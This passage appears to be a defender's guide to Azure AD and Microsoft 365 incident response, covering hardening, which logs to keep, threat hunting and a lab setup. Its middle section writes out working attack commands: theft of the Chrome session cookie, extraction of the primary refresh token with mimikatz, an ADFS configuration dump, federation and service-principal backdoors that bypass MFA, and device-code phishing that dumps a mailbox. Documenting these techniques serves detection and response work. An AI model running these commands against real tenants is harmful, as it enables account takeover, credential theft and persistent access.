-   **Reduce the risk of phishing attacks,** including by deploying email tooling that restricts attachment file-types and scans for malicious content, and by deploying always-on web security tooling that blocks malicious content and website categories.

-   **Harden workstations used by employees**, including by hardening endpoints to restrict the execution of untrusted scripts and executables (including with EPP tooling and Attack Surface Reduction rules), removing local administrator privileges from standard accounts and restricting the execution of untrusted Microsoft Office macros.

-   **Improve the security of the on-premises environment**, including by restricting internet access for all servers to an allow list, proactive hunting for Active Directory hygiene issues (including by running [PingCastle](https://www.pingcastle.com/),  [Bloodhound](https://github.com/BloodHoundAD/BloodHound) and [Trimarc ADChecks](https://www.hub.trimarcsecurity.com/post/securing-active-directory-performing-an-active-directory-security-review)), and performing regular internal vulnerability scanning.

-   **Use security testing to validate improvements made**, including by using ‘red teaming’ to validate detection and response capabilities.

## Key logs to identify and preserve in the initial stages of a response

### Azure AD and Microsoft 365 logs

-   Microsoft Office 365 Unified Audit Logs (single exports limited to 50,000) (not configured by default) (if not already onboarded to Sentinel retained for 90 days E3 and 1 year for E5)

-   Azure AD logs (if not already onboarded to Azure Sentinel [retained for 30 days with Azure AD Premium P1/P2](https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/reference-reports-data-retention)), note there are several types of logs:  
    - Audit log  
    - Sign-in logs  
    - NonInteractiveUserSignInLogs  
    - ServicePrincipalSignInLogs  
    - ManagedIdentitySignInLogs  
    - ProvisioningLogs  
    - ADFSSignInLogs  
    - RiskyUsers  
    - UserRiskEvents
-   Azure Activity logs ([retained for 90 days](https://docs.microsoft.com/en-us/azure/azure-monitor/essentials/activity-log))

-   Microsoft Endpoint Manager Audit Logs

-   Azure Key Vault logging

-   Azure Identity Protection Risky sign-ins and detections


If **Azure AD logs are not already being ingested into a SIEM, there are a two options available for exporting them:**

-   Exporting via the Unified Audit Logs (UAL). Azure AD logs in the UAL are not stored in the same structure as those in Azure Sentinel. Logs from the UAL can be exported and then manually imported into Azure Data Explorer for analysis. Queries that can be used to search through the UAL logs in Azure Data Explorer are well documented [here](https://m365internals.com/2021/07/13/what-ive-learned-from-doing-a-year-of-cloud-forensics-in-azure-ad/).

-   Exporting via the Azure AD Console. Azure AD logs exported using this method are not stored in the same structure as those in Azure Sentinel.

-   Exporting via PowerShell. Azure AD logs can be exported via PowerShell using the AzureADPreview (_Get-AzureADAuditDirectoryLogs_ and _Get-AzureADAuditSignInLogs_). These can then be converted into JSON and imported into Azure Data Explorer for analysis. These logs will be in the same structure as the logs are present in Azure Sentinel. As a result well documented Sentinel KQL [detection queries](https://github.com/Azure/Azure-Sentinel/tree/master/Detections/AuditLogs) can be run against these with minimal modifications.

**Logs from on-premises systems**

-   Security Event Logs from Tier 0 systems (including domain controllers, ADFS and AD connect servers)

-   Antivirus logs from management console

-   VPN logs

-   Exchange logs

-   vCenter logs

-   Security logs from multi-factor authentication management server

-   Privilege Access Management logs

### **Other logs**

-   Authentication logs from SaaS applications


## Initial access techniques for gaining access to Microsoft 365 and Azure AD

**Phishing and deploying malware to gain valid credentials**

-   Send phishing emails that deploy credential-stealing malware (username / passwords combinations, session tokens, primary refresh token)

-   Send phishing emails that use fake websites to compromise user’s username and passwords combinations (T1566.002)

-   Gain credentials (username and passwords combinations, or session tokens) from third-parties that deploy credential-stealing malware

-   Pass the Cert

**Phishing to gain access to accounts**

-   Send phishing emails that use the device-code phishing attack

-   Send phishing emails that use the consent grant attack to register malicious applications to access user data

**Brute forcing accounts to gain valid credentials**

-   Brute forcing credentials via legacy protocols (OWA / EWS)

-   Bruteforce via Azure AD Sign-in page

-   Bruteforce via Autologon API

**Compromising cloud-service providers (CSP) to gain access to tenants**

-   Compromise an account within a CSP’s tenant with Delegated Admin Privileges privileges to gain access to victim tenant (T1078.004)

-   Compromise an account within a CSP’s tenant with Admin on Behalf Of (AOBO) permissions to gain access to victim tenant (T1078.004)

**Compromising on-premises network to gain access to tenants**

-   Stealing or modify token-signing certificates to perform a Golden SAML attack

-   Compromise the AZUREADSSOACC account to forge Kerberos tickets (Silver ticket attack)

-   Compromise the Azure AD Connect accounts to set password for accounts in privileged cloud groups

-   Crack and dump clear text credentials to accounts in privileged cloud groups by compromising workstations, servers and domain controllers

-   Compromise stored service principal credentials from on-premise systems, and use these to authenticate to Azure AD

-   Backdoor the Pass-Through Authentication process to compromise cloud accounts

-   Compromise secrets from multi-factor authentication management server and use this to bypass MFA

**Compromising third-parties**

-   Compromise stored service principal credentials from on-premise systems, and use these to authenticate to Azure AD

-   Compromise secrets from multi-factor authentication management server and use this to bypass MFA


----------

## Azure AD Attack Techniques

  * [Background reading on Azure AD and authentication](#background-reading-on-azure-ad-and-authentication)
  * [Background reading on attack techniques](#background-reading-on-attack-techniques)
  * [Quick references](#quick-references)
  * [Reconnaissance against Azure AD tenants](#reconnaissance-against-azure-ad-tenants)
  * [Authenticated reconnaissance against Azure AD](#authenticated-reconnaissance-against-azure-ad)
  * [Using a compromised workstation to gain access to cloud identities and data](#using-a-compromised-workstation-to-gain-access-to-cloud-identities-and-data)
    + [Stealing the persistent authentication cookie from a compromised workstation](#stealing-the-persistent-authentication-cookie-from-a-compromised-workstation)
    + [Obtaining a refresh token from a compromised workstation](#obtaining-a-refresh-token-from-a-compromised-workstation)
    + [Stealing the primary refresh token from a compromised workstation](#stealing-the-primary-refresh-token-from-a-compromised-workstation)
    + [Dumping clear text credentials to authenticate to cloud services](#dumping-clear-text-credentials-to-authenticate-to-cloud-services)
  * [Using a compromised AD domain to gain access to cloud identities and data](#using-a-compromised-ad-domain-to-gain-access-to-cloud-identities-and-data)
    + [Stealing or modify token-signing certificates to perform a Golden SAML attack](#stealing-or-modify-token-signing-certificates-to-perform-a-golden-saml-attack)
    + [Compromising the AZUREADSSOACC account to forge Kerberos tickets](#compromising-the-azureadssoacc-account-to-forge-kerberos-tickets)
    + [Setting the password for an account in privileged cloud groups](#setting-the-password-for-an-account-in-privileged-cloud-groups)
    + [Dumping clear text credentials to accounts in privileged cloud groups](#dumping-clear-text-credentials-to-accounts-in-privileged-cloud-groups)
  * [Using a compromised cloud global admin account gain access to on-prem](#using-a-compromised-cloud-global-admin-account-gain-access-to-on-prem)
  * [Using a compromised third-party to gain access to cloud identities and data](#using-a-compromised-third-party-to-gain-access-to-cloud-identities-and-data)
  * [Using phishing attacks to gain access to cloud identities and data](#using-phishing-attacks-to-gain-access-to-cloud-identities-and-data)
    + [Consent grant phishing attack](#consent-grant-phishing-attack)
  * [Using password spraying to cloud accounts](#using-password-spraying-to-cloud-accounts)
  * [Gaining persistent access to cloud identities and data](#gaining-persistent-access-to-cloud-identities-and-data)
    + [Creating a new Service Principals to provide long-term API-based access](#creating-a-new-service-principals-to-provide-long-term-api-based-access)
    + [Adding credentials to an existing new Service Principals to provide long-term API-based access](#adding-credentials-to-an-existing-new-service-principals-to-provide-long-term-api-based-access)
    + [Configuring new or modifying existing federation trusts to perform Golden SAML attacks](#configuring-new-or-modifying-existing-federation-trusts-to-perform-golden-saml-attacks)
    + [Joining a fake device to Azure AD](#joining-a-fake-device-to-azure-ad)
    + [Dumping credentials for Azure resources](#dumping-credentials-for-azure-resources)
    + [Modify conditional access to add in MFA trusted IPs](#modify-conditional-access-to-add-in-mfa-trusted-ips)
  * [Pass the certificate](#pass-the-certificate)
  * [Hunting for backdoors](#hunting-for-backdoors)
    + [Commands to manually audit federation trusts](#commands-to-manually-audit-federation-trusts)
    + [Commands to manually audit service principals](#commands-to-manually-audit-service-principals)
      - [Review service principals with credentials](#review-service-principals-with-credentials)
    + [Review service principals with credentials and risky permissions](#review-service-principals-with-credentials-and-risky-permissions)
    + [Further hunting](#further-hunting)
  * [Notes on building a lab](#notes-on-building-a-lab)

## Background reading on Azure AD and authentication 

* [Microsoft ITOps | OPS108: Windows authentication internals in a hybrid world](https://techcommunity.microsoft.com/t5/itops-talk-blog/ops108-windows-authentication-internals-in-a-hybrid-world/ba-p/2109557)
* [Ignite | Deep-dive: Azure Active Directory Authentication and Single-Sign-On](https://channel9.msdn.com/Events/Ignite/Microsoft-Ignite-Orlando-2017/BRK3015)
* [OAuth 2.0 and OpenID Connect](https://www.youtube.com/watch?v=996OiexHze0&ab_channel=OktaDev)
* [Microsoft Identity Platform](https://docs.microsoft.com/en-us/azure/active-directory/develop/)
* [Microsoft Identity Platform | Service principles and applications](https://docs.microsoft.com/en-us/azure/active-directory/develop/app-objects-and-service-principals)
* [Microsoft Identity Platform | OAuth2 Code flow](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-auth-code-flow)
* [Microsoft Identity Platform | What is a Primary Refresh Token?](https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token)
* [Microsoft 365 internals explained | Microsoft Graph, substrate, and PowerShell with Jeffrey Snover](https://www.youtube.com/watch?v=uuiTR8r27Os&ab_channel=MicrosoftMechanics)
* [Microsoft | Azure AD Authentication basics (6 videos)](https://www.youtube.com/watch?v=fbSVgC8nGz4&list=PLLasX02E8BPBm1xNMRdvP6GtA6otQUqp0&index=13&ab_channel=MicrosoftAzure)
* [Overview of the Microsoft identity platform for developers](https://www.youtube.com/watch?v=zjezqZPPOfc)
* [Detailed look at Windows Credentials](https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication?WT.mc_id=modinfra-12977-socuff)
* [Windows internals Version 7 Part 1 Chapter 7 Security](https://www.google.com/search?q=Windows+internals+Version+7+Part+1+Chapter+7&oq=Windows+internals+Version+7+Part+1+Chapter+7&aqs=chrome..69i57.211j0j4&sourceid=chrome&ie=UTF-8)

## Background reading on attack techniques
* [Attacking and Defending the Microsoft Cloud](https://adsecurity.org/wp-content/uploads/2019/08/2019-BlackHat-US-Metcalf-Morowczynski-AttackingAndDefendingTheMicrosoftCloud.pdf) [Video](https://www.youtube.com/watch?v=SG2ibjuzRJM&ab_channel=BlackHat)
* [DEF CON 25 | Gerald Steere, Sean Metcalf - Hacking the Cloud](https://www.youtube.com/watch?v=LufXEPTlPak&ab_channel=DEFCONConference)
* [TR19 | I'm in your cloud, reading everyone's emails - hacking Azure AD via Active Directory](https://www.youtube.com/watch?v=JEIR5oGCwdg&ab_channel=TROOPERScon)
* [PSCONFEU 2020 | Abusing Azure Active Directory: Who would you like to be today? - Nestori Syynimaa](https://www.youtube.com/watch?v=tJkjOnxcw6w&ab_channel=PowerShellConferenceEU)
* [Blachhat 2020 | My Cloud is APTs Cloud: Attacking and Defending O365](https://i.blackhat.com/USA-20/Thursday/us-20-Bienstock-My-Cloud-Is-APTs-Cloud-Investigating-And-Defending-Office-365.pdf)
* [BlueHat Seattle 2019 | I'm in your cloud: A year of hacking Azure AD](https://www.youtube.com/watch?v=fpUZJxFK72k&ab_channel=MicrosoftSecurityResponseCenter%28MSRC%29)
* [AD Attack and Defense](https://github.com/infosecn1nja/AD-Attack-Defense)

## Quick references 

* [Microsoft portals](https://msportals.io/)
* [Azure AD Red Team Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest.md)
* [Azure AD Red Team Cheat Sheet - Fork](https://github.com/rootsecdev/Azure-Red-Team)
* [Decoding JWTs](https://jwt.ms/)

## Reconnaissance against Azure AD tenants

```
https://login.microsoftonline.com/<DOMAIN>/.well-known/openid-configuration
https://login.microsoftonline.com/getuserrealm.srf?login=<USER>@<DOMAIN>&xml=1
https://login.microsoftonline.com/getuserrealm.srf?login=<USER>@<DOMAIN>&xml=1
```

```
PS> Get-AADIntLoginInformation -Domain <DOMAIN> 
PS> Invoke-AADIntReconAsOutsider -DomainName <DOMAIN> | Format-Table
```

A python tool to look at [detailed federation information](https://github.com/WillOram/AzureAD-incident-response/blob/main/azureadrecon.py). 

## Authenticated reconnaissance against Azure AD 

```
roadrecon auth [-h] [-u USERNAME] [-p PASSWORD] [-t TENANT] [-c CLIENT] [--as-app] [--device-code] [--access-token ACCESS_TOKEN] [--refresh-token REFRESH_TOKEN] [-f TOKENFILE] [--tokens-stdout]
roadrecon gather
roadrecon gui
```

## Using a compromised workstation to gain access to cloud identities and data 

### Stealing the persistent authentication cookie from a compromised workstation

Remote environment 

```
Copy-Item "$Env:localappdata\Google\Chrome\User Data\Default\Cookies" .\tmp\

Add-Type -AssemblyName System.Security
$localState = Get-Content "$Env:localappdata\Google\Chrome\User Data\Local State" | ConvertFrom-Json
$encryptedKey = [convert]::FromBase64String($localState.os_crypt.encrypted_key)
$chromeMasterKey = [System.Security.Cryptography.ProtectedData]::Unprotect(($encryptedKey | Select-Object -Skip 5), $null, 'CurrentUser')
[convert]::ToBase64String($chromeMasterKey) > .\tmp\chromeMasterKey
```

Local env

```
Function Convert-ByteArrayToHex {
    [cmdletbinding()]
    param(
        [parameter(Mandatory=$true)]
        [Byte[]]
        $Bytes
    )
    $HexString = [System.Text.StringBuilder]::new($Bytes.Length * 2)
    ForEach($byte in $Bytes){
        $HexString.AppendFormat("{0:x2}", $byte) | Out-Null
    }
    $HexString.ToString()
}

$base64MasterKey = Get-Content .\chromeMasterKey
$encryptedKey = Convert-ByteArrayToHex ([convert]::FromBase64String($base64MasterKey))
$cookiePath = (Resolve-Path Cookies).Path 
.\SharpChrome.exe  cookies /target:$cookiePath /statekey:$encryptedKey /cookie:"ESTSAUTHPERSISTENT" /format:json
```

### Obtaining a refresh token from a compromised workstation

* [Background on browser SSO](https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token#browser-sso-using-prt)
* [Journey to Azure AD PRT: Getting access with pass-the-token and pass-the-cert](https://o365blog.com/post/prt/)
* [Abusing Azure AD SSO with the Primary Refresh Token](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
* [Digging further into the Primary Refresh Token](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
* [Requests AAD Refresh Token](https://github.com/leechristensen/RequestAADRefreshToken)

Key steps (user context):
* Request a PRT cookie and exchange for a (the PRT cookie expired after about 35 minutes)
* Request a refresh and access token from a Public application using a OAuth2 authorization code flow (the refresh token is valid for 90 days by default)  

### Stealing the primary refresh token from a compromised workstation 

* [Pass the PRT](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/) 

Key steps (local admin required):
* Extract PRT from LSASS
* Extract the Session Key and decrypt with DPAPI (TPM)
* Create a PRT cookie and exchange for a session cookie 

```
dsregcmd.exe /status
mimikatz.exe privilege::debug sekurlsa::cloudap
token::elevate dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```

### Dumping clear text credentials to authenticate to cloud services
* Useful if domain account is a high-privilege cloud account
* Enable WDigest with [Invoke-WdigestDowngrade.ps1](https://github.com/HarmJ0y/Misc-PowerShell/blob/master/Invoke-WdigestDowngrade.ps1)
* If MFA is required credentials could potentially be used through a proxy when Conditional Access policies not configured to require MFA from trusted locations 
* Check [MFASweep](https://github.com/dafthack/MFASweep)

## Using a compromised AD domain to gain access to cloud identities and data 

### Stealing or modify token-signing certificates to perform a Golden SAML attack

* Stealing token-signing certificates from on-premises ADFS servers to forge SAML tokens "Golden SAML" attack. 
* Allows anyone with the certificate to impersonate any user to Azure AD. 
* Can steal token-signing certificates to ADFS or add an alternative token-signing certificate
* [Export Active Directory Federation Services (AD FS) Token Signing Certificate](https://github.com/Azure/SimuLand/blob/main/3_simulate_detect/credential-access/exportADFSTokenSigningCertificate.md)
* [FireEye Azure AD backdoors](https://www.fireeye.com/blog/threat-research/2020/09/detecting-microsoft-365-azure-active-directory-backdoors.html)

Export ADFS configuration: 
```
PS> $ADFS = Get-WmiObject -Namespace root/ADFS -Class SecurityTokenService  
PS> $conn = $ADFS.ConfigurationDatabaseConnectionString  
PS> $SQLclient = new-object System.Data.SqlClient.SqlConnection -ArgumentList $conn  
PS> $SQLclient.Open()  
PS> $SQLcmd = $SQLclient.CreateCommand()  
PS> $SQLcmd.CommandText = "SELECT ServiceSettingsData from IdentityServerPolicy.ServiceSettings"  
PS> $SQLreader = $SQLcmd.ExecuteReader()  
PS> $SQLreader.Read() | Out-Null  
PS> $settings=$SQLreader.GetTextReader(0).ReadToEnd()  
PS> $SQLreader.Dispose()  
PS> \[xml\]$xml=$settings  
```
ADFSDump https://github.com/fireeye/ADFSDump

### Compromising the AZUREADSSOACC account to forge Kerberos tickets

* [https://o365blog.com/post/on-prem_admin/](https://o365blog.com/post/on-prem_admin/)
* Dump the hash for the account AZUREADSSOACC using dcsync or from NTDS.DIT
* Forge Kerberos tickets for users synced with Azure AD 

### Setting the password for an account in privileged cloud groups

* Compromise Azure AD connector account (stored in a local configuration database)
* [https://o365blog.com/post/on-prem_admin/](https://o365blog.com/post/on-prem_admin/)

```
$creds = Get-AADIntSyncCredentials
Get-AADIntAccessTokenForAADGraph -Credentials $creds -SaveToCache
Get-AADIntSyncObjects | Select UserPrincipalName,SourceAnchor,CloudAnchor | Sort UserPrincipalName
Set-AADIntUserPassword ...
```

Using a compromised AD sync accounts [I'm in your cloud tenant](https://dirkjanm.io/assets/raw/Im%20in%20your%20cloud%20bluehat-v1.0.pdf)
* Dump all on-premise password hashes (if PHS is enabled)
• Log in on the Azure portal (since it’s a user)
• Bypass conditional access policies for admin accounts
• Add credentials to service principals
• Modify service principals properties
• Modify/backdoor/remove conditional access policies (internal API)

### Dumping clear text credentials to accounts in privileged cloud groups
* Credential dumping and lateral movement
* DCsync / NTDTS etc. 
* If MFA is required credentials could potentially be used through a proxy when Conditional Access policies not configured to require MFA from trusted locations 
* Check [MFASweep](https://github.com/dafthack/MFASweep)

## Using a compromised cloud global admin account gain access to on-prem 

* [Death from above](https://posts.specterops.io/death-from-above-lateral-movement-from-azure-to-on-prem-ad-d18cb3959d4d)

## Using a compromised third-party to gain access to cloud identities and data 

* Stealing the certificates used for service principals (see the attack against Mimecast)

## Using phishing attacks to gain access to cloud identities and data 

* [Introducing a new phishing technique for compromising Office 365 accounts](https://o365blog.com/post/phishing/)
* [The art of the device code phish](https://0xboku.com/2021/07/12/ArtOfDeviceCodePhish.html)
* The user code is valid only for 15 minutes

```
> Get-AzureToken -Client Graph
> RefreshTo-MSGraphToken -refreshToken $response.refresh_token -domain <DOMAIN> -Device iPhone -Browser Safari
> Dump-OWAMailboxViaMSGraphApi -AccessToken $MSGraphToken.access_token -mailFolder inbox -top 1 -Device iPhone -Browser Safari
```

Uses Microsoft Office client id d3590ed6-52b3-4102-aeff-aad2292ab01c

### Consent grant phishing attack

* todo

## Using password spraying to cloud accounts

* [MSOLSpray](https://github.com/dafthack/MSOLSpray)

## Gaining persistent access to cloud identities and data 

### Creating a new Service Principals to provide long-term API-based access 

```
PS> Get-AzureADServicePrincipal -all $true | Where-Object{$\_.KeyCredentials -ne $null}  
PS> $sp = New-AzADServicePrincipal -DisplayName 'MicrosoftSyncShare'  
PS> New-AzureADServicePrincipalKeyCredential -objectid $sp.ObjectId -EndDate "01-01-2022 12:00:00" -StartDate "01-03-2021 14:12:00" -CustomKeyIdentifier "Test" -Type AsymmetricX509Cert -Usage Verify -Value $keyValue  
```

### Adding credentials to an existing new Service Principals to provide long-term API-based access

```
PS> $cert = New-SelfSignedCertificate -dnsname some.domain.com -CertStoreLocation cert:\LocalMachine\My -Provider “Microsoft Enhanced RSA and AES Cryptographic Provider”  
PS> $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())   
PS> $sp = get-azureadserviceprincipal -searchstring SEARCHSTRING  
PS> New-AzureADServicePrincipalKeyCredential -objectid $sp.ObjectId -EndDate "01-01-2022 12:00:00" -StartDate "01-03-2021 14:12:00" -CustomKeyIdentifier "Test" -Type AsymmetricX509Cert -Usage Verify -Value $keyValue  
PS> Connect-AzureAD  -Tenant TENANTID -ApplicationID APPID -CertificateThumbprint CERTTHUMBPRINT  
```

Creates the Azure AD audit log event "Add service principal credentials"

```
PS> New-AzureADServicePrincipalPasswordCredential -objectid $sp.ObjectId -EndDate "01-01-2030 12:00:00" -StartDate "04-04-2020 12:00:00"  -Value PASSWORD  
```
Creates the Azure AD audit log event "Add service principal credentials"

### Configuring new or modifying existing federation trusts to perform Golden SAML attacks

* Adding new federation trusts to or modifying existing federation trusts to add new token-signing certificates, to forge SAML authentication tokens

```
PS> Get-AADIntAccessTokenForAADGraph -savetocache                                                                       
PS> ConvertTo-AADIntBackdoor -domain maliciousdomain.com     
PS> get-msoluser | select UserPrincipalName, ImmutableId  
PS> Open-AADIntOffice365Portal -ImmutableID $id -UseBuiltInCertificate -ByPassMFA $true -Issuer ISSUER  
```
Creates the Azure AD audit log event "Set domain authentication"

```
PS> Get-MSOLUser | Where-Object{$\_.DisplayName -eq 'Will'} | select UserPrincipalName, ImmutableId  
PS> Get-MsolDomainFederationSettings -DomainName $domainname | Select IssuerUri  
PS> Get-MsolDomainFederationSettings -DomainName $domainname | Select *  
PS> Set-MsolDomainFederationSettings -DomainName $domainname -NextSigningCertificate $malicious_cert  
PS> Get-MsolDomainFederationSettings -DomainName $domainname | Select *  
PS> Open-AADIntOffice365Portal -ImmutableID $id -UseBuiltInCertificate -ByPassMFA $true -Issuer $issueruri  
```

AuditLogs | where OperationName =~ "Set federation settings on domain"

### Joining a fake device to Azure AD

* [Journey to Azure AD PRT: Getting access with pass-the-token and pass-the-cert](https://o365blog.com/post/prt/)

```
Join-AADIntDeviceToAzureAD -DeviceName "My computer" -DeviceType "Commodore" -OSVersion "C64"
$prtKeys = Get-AADIntUserPRTKeys -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx
```

### Dumping credentials for Azure resources

* [Microburst] (https://github.com/NetSPI/MicroBurst)
* [Get-AzPassword](https://www.netspi.com/blog/technical/cloud-penetration-testing/a-beginners-guide-to-gathering-azure-passwords/)
* [Azure PrivEsc](https://www.youtube.com/watch?v=OES9RU0WTH0&ab_channel=DEFCONConference)

```
Import-Module Microburst.psm1
Get-AzurePasswords
Get-AzurePasswords -Verbose | Out-GridView
```
### Modify conditional access to add in MFA trusted IPs

## Pass the certificate

* [Azure AD Pass The Certificate](https://medium.com/@mor2464/azure-ad-pass-the-certificate-d0c5de624597)

## Hunting for backdoors 

* Audit federation trusts
* Audit service principal credentials, permissions and reply URLs
* Audit conditional access rules 
* Hunt for suspicious AD Sync account logons 
* Hunt for modifications to conditional access rules 
* Hunt for suspicious sign-ins by service principals (Using AADServicePrincipalSignInLogs logs. Requires additional configuration to be sent to Sentinel)
* Hunt for service principals accessing users' mailboxes (MailItemsAccessed log is enabled by default for users that are assigned an Office 365 or Microsoft 365 E5 license or for organizations with a Microsoft 365 E5 Compliance add-on subscription. The MailItemsAccessed mailbox auditing action covers all mail protocols: POP, IMAP, MAPI, EWS, Exchange ActiveSync, and REST.)


```
PS> Install-module AzureADPreview -AllowClobber
PS> Connect-AzureAD  

PS> Install-module ExchangeOnlineManagement  
PS> Connect-ExchangeOnline  

PS> Install-module MSOnline  
PS> Connect-MsolService  

PS> Install-Module AZ
PS> Connect-AzAccount

PS> # CISA's Sparrow  
PS> Invoke-WebRequest 'https://github.com/cisagov/Sparrow/raw/develop/Sparrow.ps1' -OutFile 'Sparrow.ps1' -UseBasicParsing   
PS> .\Sparrow.ps1  

PS> # CrowdStrike's Azure Reporting Tool (CRT)  
PS> Invoke-WebRequest 'https://github.com/CrowdStrike/CRT/raw/main/Get-CRTReport.ps1' -OutFile 'Get-CRTReport.ps1' -UseBasicParsing  
PS> .\Get-CRTReport.ps1  

PS> # AzureHound  
PS> Invoke-WebRequest 'https://raw.githubusercontent.com/BloodHoundAD/AzureHound/master/AzureHound.ps1' -OutFile 'AzureHound.ps1' -UseBasicParsing  
PS> . .\AzureHound.ps1  
PS> Invoke-AzureHound  

PS> # Hawk
PS> Install-module hawk
PS> start-hawktenantinvestigation  
```

### Commands to manually audit federation trusts

**Azure AD**

PS> Get-MsolDomain | Format-List 
PS> Get-AzureADDomain | Format-List (newer version of the command above)
PS> Get-MsolFederationProperty -DomainName ******* | Format-List

**Exchange Online** (unclear if these can be changed, Exchange Online PowerShell APIs to configure these state they only work for on-prem Exchange)

PS> Get-FederationTrust | Format-List
PS> Get-FederatedOrganizationIdentifier -IncludeExtendedDomainInfo  | Format-List
PS> Get-FederatedOrganizationIdentifier -IncludeExtendedDomainInfo | select-object -expandproperty Domains  

### Commands to manually audit service principals

* CISA Sparrow script provides the best data for this
* Audit the creation and use of credentials for service principal. 
* Review the permissions assigned to service principles. 
* Audit the assignment of credentials to applications that allow non-interactive sign-in by the application and permissions for the Microsoft Graph API.
* Look for unusual application usage, such as use of dormant applications.

#### Review service principals with credentials 

```
PS> Get-AzureADServicePrincipal  
PS> Get-AzureADServicePrincipal -all $true | Where-Object{$\_.KeyCredentials -ne $null} | Select *  
PS> Get-AzureADServicePrincipal -all $true | Where-Object{$\_.PasswordCredentials -ne $null} | Select *   
```

### Review service principals with credentials and risky permissions 

See scripts output in Sparrow and CRT tool.  

```
PS> # Get Service Principal using objectId  
PS> $sp = Get-AzureADServicePrincipal -ObjectId "OBJECTID"    

PS> # Get Azure AD App role assignments using objectID of the Service Principal (users)  
PS> $assignments = Get-AzureADServiceAppRoleAssignment -ObjectId $sp.ObjectId -All $true   

PS> # Get all delegated permissions for the service principal  
PS> $spOAuth2PermissionsGrants = Get-AzureADOAuth2PermissionGrant -All $true| Where-Object {$\_.clientId -eq $sp.ObjectId} | Format-List  

PS> # Get all application permissions for the service principal  
PS> $spApplicationPermissions = Get-AzureADServiceAppRoleAssignedTo -ObjectId $sp.ObjectId -All $true | Where-Object { $\_.PrincipalType -eq "ServicePrincipal" }

PS> # Get all application permissions to Microsoft Graph for the service principal  
PS> $spApplicationPermissions = Get-AzureADServiceAppRoleAssignedTo -ObjectId $sp.ObjectId -All $true | Where-Object {$\_.DisplayName -eq "Microsoft Graph"}    

PS> # Look up Microsoft Graph permissions    
PS> $GraphSP = Get-AzureADServicePrincipal -All $true | Where-Object {$\_.DisplayName -eq "Microsoft Graph"}    
PS> $GraphAppRoles = $GraphSP.AppRoles | Select-Object -Property AllowedMemberTypes, Id, Value    
PS> $GraphAppRoles| Where-Object {$\_.Id -eq "e2a3a72e-5f79-4c64-b1b1-878b674786c9" -or $\_.Id -eq "810c84a8-4a9e-49e6-bf7d-12d183f40d01"}    
```

App permissions reference https://docs.microsoft.com/en-us/graph/permissions-reference   

List of risky app permissions https://github.com/mepples21/azureadconfigassessment  

Creat a test app https://docs.microsoft.com/en-gb/azure/active-directory/develop/quickstart-v2-javascript   

Microsoft blog references Mail.Read and Mail.ReadWrite

Mimecast: Mimecast ask organisations to add an application/service principal to Azure AD and add a certificate to that service principal, allowing Mimecast to authenticate to it. They then ask organisations to assign that service principal the permissions __full_access_as_app__ to __Office 365 Exchange Online__. See: https://community.mimecast.com/s/article/Creating-an-Office-365-Association-for-Server-Connections-1061681132

### Further hunting 

* [Crowdstrike blog on hunting for modifications](https://www.crowdstrike.com/blog/crowdstrike-launches-free-tool-to-identify-and-help-mitigate-risks-in-azure-active-directory/) There is a good list in here of what to search for in Azure AD that goes further than the above including:
  * Reviewing trust relationships with partners including IT consultants, vendors and resellers 
  * Reviewing Azure AD allowed identity providers (SAML IDPs through direct federation or social logins)
  * Reviewing Azure B2B external identities’ access to the Azure portal 
  * Review environment for overly privileged service accounts that may have access to Azure  
 
Use of token-signing certificates to spoof SAML tokens. Azure AD UserAuthenticationMethod: 16457 indicates a password with MFA was satisfied by a federated identity provider: https://twitter.com/ItsReallyNick/status/1349536271010574338?s=20

## Notes on building a lab

* Purchase a test domain name. 
* Use Let's Encrypt to issue a wildcard certificate for the domain name. 
* Configure an Azure AD tenant and configure the domain as a custom domain. 
* Deploy three Windows Servers in Azure, and one test workstation. 
* Setup one of the Windows Servers as a domain controller, use the same domain name as previously registered. 
* Domain join all the other systems (after configuring the DC as the DNS server for the VNet). 
* Use AD Connect to configure federation with Azure AD, including configuring the ADFS server and the WAP. 
* Configure 443 access to the WAP from the internet.
* Configure Azure Sentinel, onboard the security logs from all systems and the Azure AD audit logs. 
* Configure the diagnostic settings for Azure AD to collect all logs data types. 
* Enable audit logging in the Security & Compliance Center. 
* Create and configure a test application in Azure AD, configure Mail.Read permissions. Use the web application quick-start to log-in test users to the app and require them to consent access to their data. 
* Create and configure a test application in Azure AD, configure Mail.Read permissions. Grant [admin consent](https://docs.microsoft.com/en-us/azure/active-directory/manage-apps/grant-admin-consent) to the application. 
